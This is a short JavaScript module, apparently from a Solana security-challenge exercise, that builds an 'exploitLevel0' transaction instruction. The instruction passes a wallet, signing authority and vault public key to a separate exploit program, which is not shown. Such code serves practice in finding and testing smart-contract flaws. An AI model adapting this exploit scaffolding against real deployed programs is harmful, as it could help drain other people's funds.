const {
    TransactionInstruction,
    SYSVAR_RENT_PUBKEY,
    SystemProgram,
} = require("@solana/web3.js");

const lo = require('@solana/buffer-layout');

const WALLET_LEN = 64;
const WALLET = lo.struct([
    lo.seq(lo.u8(), 32), // authority (Pubkey)
    lo.seq(lo.u8(), 32), // vault (Pubkey)
]);

const PUBKEY = lo.seq(lo.u8(), 32);

function AccountMetaReadonly(pubkey, isSigner) {
    return {
        pubkey,
        isWritable: false,
        isSigner,
    }
}

function AccountMeta(pubkey, isSigner) {
    return {
        pubkey,
        isWritable: true,
        isSigner,
    }
}

function bytesToArray(b) {
    let a = new Array(b.length);
    for (var i = 0; i < b.length; i++) {
        a[i] = b[i];
    }
    return a;
}

function exploitLevel0(exploitProgramId, walletAddress, vaultAddress, authority) {
    const walletMeta = AccountMeta(walletAddress, false);
    const authorityMeta = AccountMeta(authority.publicKey, true);
    const keys = [
        walletMeta, authorityMeta, AccountMeta(SYSVAR_RENT_PUBKEY, false), AccountMeta(SystemProgram.programId, false),
    ];
    let instruction = new TransactionInstruction({
        keys,
        programId: exploitProgramId,
        data: [0].concat(PUBKEY.decode(vaultAddress.toBytes())),
    });
    return instruction;
}

exports.Exploit = {
    exploitLevel0: exploitLevel0,
    WALLET_LEN: WALLET_LEN,
}

